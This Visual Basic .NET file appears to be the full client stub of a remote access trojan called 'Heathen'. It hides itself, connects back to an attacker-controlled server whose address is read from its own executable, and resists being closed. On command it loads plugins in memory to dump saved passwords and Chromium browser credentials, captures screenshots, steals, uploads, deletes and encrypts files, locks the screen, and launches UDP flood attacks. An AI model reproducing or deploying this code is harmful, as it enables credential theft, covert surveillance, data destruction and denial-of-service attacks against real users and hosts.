﻿Imports System.Collections.Concurrent
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32

Public Class Form1
    Public unlock As String = "" 'Key for ScreenLocker
    Public Connecteddd As Boolean = False ' Try to connect
    Dim splitz As String = "||||SPLITTTT||||" 'String to build server
    Dim MonClient As TcpClient
    Dim id As String

    Dim o As TcpClient


    '' CHANGE WALLPAPER FCT
    Const param1 As Integer = 20
    Const param2 As Integer = &H1
    Const param3 As Integer = &H2

    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    '' CHANGE WALLPAPER FCT



    Public ClearMyplug As Boolean = False


    ''UDP

    Public IP As String = ""
    Public UDPByte As Byte() = New Byte() {}

    ''UDP
    Private Sub LireLesMessages(ByVal Context As TaskScheduler, ByVal stream As NetworkStream) 'Lire les messages du serveur

        Try
            Dim Buffer(4096) As Byte
            While (True)
                Dim lu As Integer = stream.Read(Buffer, 0, Buffer.Length)
                If (lu > 0) Then
                    Dim Message As String = Encoding.UTF8.GetString(Buffer, 0, lu)
                    Task.Factory.StartNew(Sub() NouveauMessage(Message, False), CancellationToken.None, TaskCreationOptions.None, Context)
                Else
                    Task.Factory.StartNew(Sub() NouveauMessage("Le serveur a fermé la connexion.", True), CancellationToken.None, TaskCreationOptions.None, Context)
                    Exit Sub
                End If

            End While
        Catch ex As Exception
            Exit Sub
        End Try

    End Sub
    Public Function Base64ToImage(ByVal base64String As String) As Image
        ' Convert Base64 String to byte[]
        Dim imageBytes As Byte() = Convert.FromBase64String(base64String)
        Dim ms As New MemoryStream(imageBytes, 0, imageBytes.Length)

        ' Convert byte[] to Image
        ms.Write(imageBytes, 0, imageBytes.Length)
        Dim ConvertedBase64Image As Image = Image.FromStream(ms, True)
        Return ConvertedBase64Image
    End Function
    Public Sub SetWallpapertoBackground(ByVal k As String)




        Dim lk As New Random

        Dim oooddd = lk.Next(10000, 99999)

        IO.File.WriteAllText("Image.txt", k)

        PictureBox1.Image = Base64ToImage(k)



        Dim hh As String = (IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")
        PictureBox1.Image.Save(hh, ImageFormat.Png)


        SystemParametersInfo(param1, 0, hh, param2 Or param3)


        TextBox1.Text = String.Empty

    End Sub

    Public Sub TakeScreen(ByVal filename As String)
        Try
            Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
            Dim image As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
            Dim graphics As Graphics = Graphics.FromImage(image)
            Dim upperLeftSource As New Point(0, 0)
            Dim upperLeftDestination As New Point(0, 0)
            graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
            graphics.Flush()
            image.Save(filename, ImageFormat.Png)

        Catch ex As Exception

        End Try
    End Sub

    Public Sub PWLOAD(ByVal byt As Byte(), ByVal type As String, ByVal methodl As String)
        Dim assemblytoload As Assembly = Assembly.Load(byt)

        Dim method As MethodInfo = assemblytoload.[GetType](type).GetMethod(methodl)
        Dim obj As Object = assemblytoload.CreateInstance(method.Name)

        Dim ks As String = CStr(method.Invoke(obj, Nothing)) + vbCrLf + "END PASSWORD"

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ks)
        MonClient.GetStream().Write(buffer, 0, buffer.Length)


        TextBox1.Text = String.Empty

    End Sub
    Public Sub UDP(ByVal E As Byte(), ByVal IPNEEDED As String)
        Dim assemblytoload As Assembly = Assembly.Load(E)


        Dim method As MethodInfo = assemblytoload.[GetType]("DDOS.Methods").GetMethod("WorkerThreadFORUDP")

        Dim obj As Object = assemblytoload.CreateInstance(method.Name)
        Dim k As Object = IPNEEDED

        method.Invoke(obj, New Object() {k})
    End Sub
    Public Sub MessageFromHost(ByVal h As String)
        MessageBox.Show(h, "Heathen", MessageBoxButtons.OK, MessageBoxIcon.Information)
        TextBox1.Text = String.Empty
    End Sub

    Public Sub GetAllTasks()

        Dim Ultitask As New StringBuilder



        Dim jk As Process() = Process.GetProcesses
        For Each h In jk
            Dim lvi As New ListViewItem(h.ProcessName) 'first column

            lvi.SubItems.Add(h.Id) 'column 2

            lvi.SubItems.Add(h.BasePriority) 'column 3 

            ListView1.Items.Add(lvi) 'add all in listview

        Next
        ListView1.Sorting = SortOrder.Ascending

        For Each h As ListViewItem In ListView1.Items

            Ultitask.AppendLine(h.Text & "////" & h.SubItems(1).Text & "////" & h.SubItems(2).Text)

        Next




        Ultitask.Append("ThisIISSTASK")


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(Ultitask.ToString)
        MonClient.GetStream().Write(buffer, 0, buffer.Length)


        TextBox1.Text = String.Empty
    End Sub

    Public Sub KillThat(ByVal k As String)
        Dim result As String = ""
        Dim jk As Process() = Process.GetProcesses
        For Each h In jk

            If h.ProcessName = k Then
                Try
                    h.Kill()
                    result = "Amazingfortaskkill"
                    Dim buffer() As Byte = Encoding.UTF8.GetBytes(result)
                    MonClient.GetStream().Write(buffer, 0, buffer.Length)

                Catch ex As Exception
                    result = "Notgoodfortaskkill"
                    Dim buffer() As Byte = Encoding.UTF8.GetBytes(result)
                    MonClient.GetStream().Write(buffer, 0, buffer.Length)

                End Try
            End If
        Next

        TextBox1.Text = String.Empty
    End Sub
    Public Sub ScreenLock()

        Form2.Show()

        TextBox1.Text = String.Empty
    End Sub
    Public Sub FileManager()
        Dim Path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

        Dim ListOfGarbage As New StringBuilder


        For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)


            Dim MyNameIsWhat = IO.Path.GetFileName(yu)



            ListOfGarbage.AppendLine(MyNameIsWhat)




        Next
        ListOfGarbage.AppendLine("StopFilesNowDir")

        For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)

            Dim MyNameIsWhat = IO.Path.GetFileName(yu)


            ListOfGarbage.AppendLine(MyNameIsWhat)




        Next

        ListOfGarbage.Append("StopAllAndSendItRightNow")

        ListOfGarbage.Append(Path)




        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)

        MonClient.GetStream().Write(buffer, 0, buffer.Length)
        TextBox1.Text = String.Empty

        GetVolume()
    End Sub

    Public Sub NewVolFile(ByVal NewP As String)
        Dim Path = NewP

        Dim ListOfGarbage As New StringBuilder


        For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)


            Dim MyNameIsWhat = IO.Path.GetFileName(yu)



            ListOfGarbage.AppendLine(MyNameIsWhat)




        Next
        ListOfGarbage.AppendLine("StopFilesNowDir")

        For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)

            Dim MyNameIsWhat = IO.Path.GetFileName(yu)


            ListOfGarbage.AppendLine(MyNameIsWhat)




        Next

        ListOfGarbage.Append("StopAllAndSendItRightNow")

        ListOfGarbage.Append(Path)




        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)

        MonClient.GetStream().Write(buffer, 0, buffer.Length)
        TextBox1.Text = String.Empty
    End Sub


    Public Sub GetVolume()

        Dim kl As New StringBuilder
        Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
        Dim d As DriveInfo
        For Each d In allDrives
            kl.AppendLine(d.Name)

        Next
        kl.Append("TheVolumeSir")

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(kl.ToString)

        MonClient.GetStream().Write(buffer, 0, buffer.Length)
        TextBox1.Text = String.Empty



    End Sub

    Public Sub FileManagerGoForward(ByVal NewPath As String)
        Try
            Dim Path = NewPath

            Dim ListOfGarbage As New StringBuilder

            '   Dim ListOfDirs As New StringBuilder
            For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
                ' Dim lvi As New ListViewItem(yu) 'first column

                Dim MyNameIsWhat = IO.Path.GetFileName(yu)



                ListOfGarbage.AppendLine(MyNameIsWhat)




            Next
            ListOfGarbage.AppendLine("StopFilesNowDir")

            For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)

                Dim MyNameIsWhat = IO.Path.GetFileName(yu)


                ListOfGarbage.AppendLine(MyNameIsWhat)




            Next

            ListOfGarbage.Append("NoGodPlsNoNOOO")

            ListOfGarbage.Append(Path)




            Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)

            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            TextBox1.Text = String.Empty

        Catch ex As Exception

            Dim buffer() As Byte = Encoding.UTF8.GetBytes("Couldn'tGOFWW")

            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            TextBox1.Text = String.Empty
        End Try
    End Sub
    Public Sub DeleteSelectedFileOrFolder(ByVal pathfileorfolder As String)

        If pathfileorfolder.EndsWith("FILES") Then
            Dim filetodelete As String = pathfileorfolder.Replace("@DELETETHISHITFILES", "")

            Try
                IO.File.Delete(filetodelete)
                Dim buffer() As Byte = Encoding.UTF8.GetBytes("SuccessWithDeletefolderSS")

                MonClient.GetStream().Write(buffer, 0, buffer.Length)
            Catch ex As Exception
                Dim buffer() As Byte = Encoding.UTF8.GetBytes("Couldn't delete the file or the folderSS")

                MonClient.GetStream().Write(buffer, 0, buffer.Length)
            End Try




        ElseIf pathfileorfolder.EndsWith("FOLDERS") Then
            Dim foldertodelete As String = pathfileorfolder.Replace("@DELETETHISHITFOLDERS", "")
            Try
                IO.Directory.Delete(foldertodelete)
                Dim buffer() As Byte = Encoding.UTF8.GetBytes("SuccessWithDeletefolderSS")

                MonClient.GetStream().Write(buffer, 0, buffer.Length)
            Catch ex As Exception

                Dim buffer() As Byte = Encoding.UTF8.GetBytes("Couldn't delete the file or the folderSS")

                MonClient.GetStream().Write(buffer, 0, buffer.Length)
            End Try
        End If
        TextBox1.Text = String.Empty

    End Sub
    Public Sub GetAllInFoSNeeded()
        Dim k As String = "System : " & My.Computer.Info.OSFullName
        'Websocketclient1.DataToSend = k + Helpe.nam
        '  Public Shared Function nam()
        Dim l = Environment.UserName


        Dim p = Environment.MachineName
        '    Dim IPaddress As String = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(Function(ip) ip.AddressFamily = AddressFamily.InterNetwork).ToString()
        Dim sl = Environment.OSVersion.VersionString

        Dim ooo As String = k + vbCrLf + "Desktop Name : " + p & vbCrLf & "Username : " + l & vbCrLf & "OS Verion : " & sl 'IPaddress


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ooo)
        MonClient.GetStream().Write(buffer, 0, buffer.Length)
        '  End Function
        TextBox1.Text = String.Empty
    End Sub
    Public Sub PlayMyAudio(ByVal stsr As String)


        Dim tobePlay As String = stsr.Replace("AudioFromPC", "")
        Dim name As New Random
        Dim name1 = name.Next(100000, 9999999).ToString

        Dim path As String = IO.Path.GetTempPath & "\" & name1 & ".mp3"
        Dim k As Byte() = Convert.FromBase64String(tobePlay)
        IO.File.WriteAllBytes(path, k)


        '   My.Computer.Audio.Play(path, AudioPlayMode.Background) Doesn'twork
        Dim processs As New ProcessStartInfo(path)


        processs.CreateNoWindow = True
        processs.UseShellExecute = True

        Process.Start(processs)


        TextBox1.Text = String.Empty


    End Sub
    Private Sub NouveauMessage(ByVal message As String, ByVal Fermé As Boolean)
        TextBox1.AppendText(message)

        If TextBox1.Text.EndsWith("ThisIsPWPlugin") Then  ''PW1



            TextBox1.Text = TextBox1.Text.Replace("ThisIsPWPlugin", "")
            Dim o As Byte() = Convert.FromBase64String(TextBox1.Text)

            Task.Run(Sub() PWLOAD(o, "PW.SteelPassword", "Dump"))



        ElseIf TextBox1.Text.EndsWith("ThisPWPlugin2") Then  ''PW2




            Dim odd = TextBox1.Text.Replace("ThisPWPlugin2", "")
            Dim o As Byte() = Convert.FromBase64String(odd)

            Task.Run(Sub() PWLOAD(o, "Plugin.Browsers.Chromium.Chromium", "Recovery"))

        ElseIf TextBox1.Text.EndsWith("ITSTIMETOSLEEP") Then  ''DISCONNECT
            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")

            MonClient.GetStream().Write(buffer, 0, buffer.Length)


            Application.Exit()
        ElseIf TextBox1.Text.EndsWith("MESASADDSDSD") Then
            Dim kkj As String = TextBox1.Text.Replace("MESASADDSDSD", "")
            MessageFromHost(kkj)



        ElseIf TextBox1.Text.EndsWith("GETMYTASKS") Then  'TASKMANAGER

            GetAllTasks()

        ElseIf TextBox1.Text.EndsWith("@&&&SCR") Then  'ScreenLocker
            Dim op As String = TextBox1.Text.Replace("@&&&SCR", "")

            unlock = op

            ScreenLock()


            ''INfo

        ElseIf TextBox1.Text = "IWouldLikeToGetSysInfo" Then


            GetAllInFoSNeeded()
            'IWouldLikeToseeYourFile


            ''AudioFromPC

        ElseIf TextBox1.Text.EndsWith("AudioFromPC") Then

            PlayMyAudio(TextBox1.Text)


            ''

        ElseIf TextBox1.Text.EndsWith("IWouldLikeToseeYourFile") Then  'FileManager 




            FileManager()


        ElseIf TextBox1.Text.EndsWith("@wheretogo") Then  'FileManager 


            Dim NewPathforward As String = TextBox1.Text.Replace("@wheretogo", "")
            FileManagerGoForward(NewPathforward)


            '    "||wheretogo"
            ''''FM
            '
            '
        ElseIf TextBox1.Text.EndsWith("@ShitWegoback") Then  'FileManager 


            Dim NewPathBack As String = TextBox1.Text.Replace("@ShitWegoback", "")

            Dim NewPath As String = IO.Directory.GetParent(NewPathBack).FullName
            FileManagerGoForward(NewPath)
            '    "||wheretogo"

            ''
            '
            '
            '
            '

        ElseIf TextBox1.Text.StartsWith("TimetoChangeVolume\") Then

            Dim jk As String = TextBox1.Text.Replace("TimetoChangeVolume\", "")

            NewVolFile(jk)
            '"TimetoChangeVolume\" + "\" +NewDrive

        ElseIf TextBox1.Text.EndsWith("SetWallpaperGoodSir") Then  ''WALLPAPER

            Dim j As String = TextBox1.Text.Replace("SetWallpaperGoodSir", "")



            Task.Run(Sub() SetWallpapertoBackground(j))



        ElseIf TextBox1.Text = "StartToChangeTheCursoToRandom" Then

            RDCTIMER.Start()

        ElseIf TextBox1.Text.EndsWith("/ThisTaskIsToKill") Then   'TASK Killer
            Dim PrepareTask As String = TextBox1.Text.Replace("/ThisTaskIsToKill", "")

            Task.Run(Sub() KillThat(PrepareTask))


        ElseIf TextBox1.Text.EndsWith("ITSTIMETODDOSWITHUDP") Then  'UDP FLOOD

            Dim j As String() = Split(TextBox1.Text, "IPPPPPP")

            Dim op As String = j(1).Replace("ITSTIMETODDOSWITHUDP", "")

            ' plug & "IPPPPPP" & IP & "ITSTIMETODDOSWITHUDP"
            '  DDOS.Methods.Udp.WorkerThread
            'IPPPPPP104.18.61.3ITSTIMETODDOSWITHUDP

            IP = op

            UDPByte = Convert.FromBase64String(j(0))

            UDPTIMER.Start()

            ''
        ElseIf TextBox1.Text.Contains("@DELETETHISHIT") Then 'DELETE FILE FROM FM

            DeleteSelectedFileOrFolder(TextBox1.Text)

            ''


        ElseIf TextBox1.Text.Contains("LockInvisiblePlease") Then


            LockThatShit()

        ElseIf TextBox1.Text.Contains("UNLockInvisiblePlease") Then
            UnlockThatShit()

        ElseIf TextBox1.Text.Contains("\CryptThatShitPlease/") Then

            Dim recept As String() = Split(TextBox1.Text, "\CryptThatShitPlease/")
            Dim file As String = recept(0).Replace("\\", "\")
            Dim herlpe As String() = Split(file, "\")
            Dim filename As String = herlpe(herlpe.Length - 1)
            Dim key As String = recept(1)

            LaunchCrypt(file, key, filename)

        ElseIf TextBox1.Text.Contains("\WhyDecrypt/") Then

            Dim recept As String() = Split(TextBox1.Text, "\WhyDecrypt/")
            Dim file As String = recept(0).Replace("\\", "\")
            Dim herlpe As String() = Split(file, "\")
            Dim filename As String = herlpe(herlpe.Length - 1)
            Dim key As String = recept(1)


            LaunchDeCrypt(file, key, filename)

        ElseIf TextBox1.Text.Contains("\DownloadThisFilePlease/") Then

            Dim thisfile As String = TextBox1.Text.Replace("\DownloadThisFilePlease/", "")

            Task.Run(Sub() RetrieveFile(thisfile))
        ElseIf TextBox1.Text.Contains("\\\UploadThereSir///") Then
            Dim seprate As String() = Split(TextBox1.Text, "\\\UploadThereSir///")

            FileThere(seprate(1), seprate(0))

        ElseIf TextBox1.Text = "\\SwapThatBitch//" Then
            '"\\SwapThatBitch//"   '\\RevertThatSwapBitch//
            SwapOn()
        ElseIf TextBox1.Text = "\\RevertThatSwapBitch//" Then
            SwapOff()
        ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT

            Dim lk As New Random
            Dim oooddd = lk.Next(10000, 99999)
            TakeScreen(IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")




            Dim data As String = Convert.ToBase64String(IO.File.ReadAllBytes(IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")) + "ILoveScreenShppppt"
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(data)
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

            IO.File.Delete(IO.Path.GetTempPath + "\" + oooddd.ToString + ".png")

            TextBox1.Text = String.Empty

            If (Fermé) Then
                ' Button1.Text = "Se connecter"
                MonClient.Close()
            End If


        End If
        FlushMemory()
    End Sub

    Public Sub FileThere(ByVal s As String, ByVal source As String)
        MessageBox.Show(s)
        Try
            IO.File.WriteAllBytes(s, Convert.FromBase64String(source))

        Catch ex As Exception

        End Try
        TextBox1.Text = String.Empty
    End Sub
    ''Come from : https://www.youtube.com/watch?v=-fPY7ecWPUA
    ''Reset Cache Memory
    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
    Public Sub FlushMemory()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
                Dim myProcesses As Process() = Process.GetProcessesByName("ApplicationName")
                Dim myProcess As Process
                'Dim ProcessInfo As Process
                For Each myProcess In myProcesses
                    SetProcessWorkingSetSize(myProcess.Handle, -1, -1)
                Next myProcess
            End If
        Catch ex As Exception
        End Try
    End Sub

    ''https://www.youtube.com/watch?v=-fPY7ecWPUA

    Public Sub RetrieveFile(ByVal file As String)
        Dim name As String() = Split(file, "\>/TheFileToWrite")
        Dim s = Convert.ToBase64String(IO.File.ReadAllBytes(file)) + "\>/TheFileToWrite" + name(name.Length - 1)
        Dim buffer() As Byte = Encoding.UTF8.GetBytes(s)

        MonClient.GetStream().Write(buffer, 0, buffer.Length)
        TextBox1.Text = String.Empty


    End Sub
    Public Sub SwapOn()
        Win32APILib.AllFunctions.SwapMouseLeftAndRight(1)
        TextBox1.Text = String.Empty
    End Sub
    Public Sub SwapOff()
        Win32APILib.AllFunctions.SwapMouseLeftAndRight(0)
        TextBox1.Text = String.Empty
    End Sub

    'From : https://github.com/xxtea/xxtea-dotnet
    '  /**********************************************************\
    '|                                                          |
    '| XXTEA.cs                                                 |
    '|                                                          |
    '| XXTEA encryption algorithm library for .NET.             |
    '|                                                          |
    '| Encryption Algorithm Authors:                            |
    '|      David J. Wheeler                                    |
    '|      Roger M. Needham                                    |
    '|                                                          |
    '| Code Author:  Ma Bingyao <mabingyao@gmail.com>           |
    '| LastModified: Mar 10, 2015                               |
    '|                                                          |
    '\**********************************************************/
    Public Sub LaunchDeCrypt(ByVal Path As String, ByVal Key As String, ByVal filename As String)

        Dim l As Byte() = Xxtea.XXTEA.Decrypt(IO.File.ReadAllBytes(Path), System.Text.Encoding.ASCII.GetBytes(Key))
        IO.File.Delete(Path)
        IO.File.WriteAllBytes(Path, l)



        TextBox1.Text = String.Empty
    End Sub
    Public Sub LaunchCrypt(ByVal Path As String, ByVal Key As String, ByVal filename As String)

        Dim l As Byte() = Xxtea.XXTEA.Encrypt(IO.File.ReadAllBytes(Path), System.Text.Encoding.ASCII.GetBytes(Key))
        IO.File.Delete(Path)
        IO.File.WriteAllBytes(Path, l)



        TextBox1.Text = String.Empty
    End Sub
    Public Sub RDC()
        Dim k As New Random
        Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
        Dim X As Integer = k.Next(0, primaryMonitorSize.Width)
        Dim Y As Integer = k.Next(0, primaryMonitorSize.Height)
        Win32APILib.AllFunctions.ChangeCursorPosition(X, Y)

    End Sub
    Public Sub UnlockThatShit()
        InvDeskLock.Close()
        TextBox1.Text = String.Empty
    End Sub
    Public Sub LockThatShit()
        InvDeskLock.Show()
        TextBox1.Text = String.Empty
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing




        If e.CloseReason = CloseReason.TaskManagerClosing Then
            '  e.Cancel = True 

            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")







            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            e.Cancel = True

        ElseIf (e.CloseReason = CloseReason.UserClosing) Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString


            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

            e.Cancel = True



        ElseIf e.CloseReason = CloseReason.None Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString



            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

        End If


    End Sub
    Private Sub MyBBClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.Closing




        If e.CloseReason = CloseReason.TaskManagerClosing Then
            '  e.Cancel = True 

            Dim o As String = MonClient.Client.LocalEndPoint.ToString
            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")







            MonClient.GetStream().Write(buffer, 0, buffer.Length)
            e.Cancel = True

        ElseIf (e.CloseReason = CloseReason.UserClosing) Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString


            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

            e.Cancel = True



        ElseIf e.CloseReason = CloseReason.None Then
            Dim o As String = MonClient.Client.LocalEndPoint.ToString



            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False

        FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        Dim data As String = Space(LOF(1))
        FileGet(1, data)
        FileClose(1)

        Dim options() As String

        options = Split(data, splitz)

        ''FOR CURSOR
        Win32APILib.AllFunctions.PlayWithWindows.SetWindowPos(Me.Handle, Win32APILib.AllFunctions.PlayWithWindows.HWND_TOPMOST, 0, 0, 0, 0, Win32APILib.AllFunctions.PlayWithWindows.SWP_NOMOVE Or Win32APILib.AllFunctions.PlayWithWindows.SWP_NOSIZE)
        ''


        If options(3) = "true" Then
            Helpe.startp(options(4))


        End If


        Try 'Pour éviter les erreurs

            MonClient = New TcpClient()
            MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
            If MonClient.Connected = True Then

                ''

                Dim l As New Random
                id = l.Next(100000, 999999).ToString
                Dim k = id + "THISISMYID"
                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                MonClient.GetStream().Write(buffer, 0, buffer.Length)
                ''
                Timer2.Start()

            Else
                'Timer2.Start()


                While MonClient.Connected = False

                    MonClient = New TcpClient()
                    MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))

                    If MonClient.Connected Then


                        Dim l As New Random
                        id = l.Next(100000, 999999).ToString
                        Dim k = id + "THISISMYID"
                        Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                        MonClient.GetStream().Write(buffer, 0, buffer.Length)
                        Timer2.Start()
                        ''
                    End If

                End While
                Timer2.Start()
                '    Timer1.Start()
            End If
            Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))

            Timer2.Start()
        Catch ex As Exception
            Timer2.Start()
        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
        Dim data As String = Space(LOF(1))
        FileGet(1, data)
        FileClose(1)
        Dim options() As String

        options = Split(data, splitz)

        Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
        Try
            Dim buffer() As Byte = Encoding.UTF8.GetBytes("NoneJustTryToConnect")
            MonClient.GetStream().Write(buffer, 0, buffer.Length)

        Catch ex As Exception
            Try
                MonClient = New TcpClient()

                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
                ' MonClient.BeginConnect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))

                Dim l As New Random
                id = l.Next(100000, 999999).ToString
                Dim k = id + "THISISMYID"
                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                MonClient.GetStream().Write(buffer, 0, buffer.Length)

                Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))

            Catch exs As Exception

            End Try
        End Try
    End Sub
    Private Sub UDPTIMER_Tick(sender As Object, e As EventArgs) Handles UDPTIMER.Tick
        If ClearMyplug = False Then
            TextBox1.Text = String.Empty
            ClearMyplug = True
        End If
        Task.Run(Sub() UDP(UDPByte, IP))
        Task.Run(Sub() UDP(UDPByte, IP))
        Task.Run(Sub() UDP(UDPByte, IP))
    End Sub

    Private Sub RDCTIMER_Tick(sender As Object, e As EventArgs) Handles RDCTIMER.Tick
        Task.Run(Sub() RDC())
        If TextBox1.Text = "StartToChangeTheCursoToRandom" Then
            TextBox1.Text = String.Empty
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub
End Class

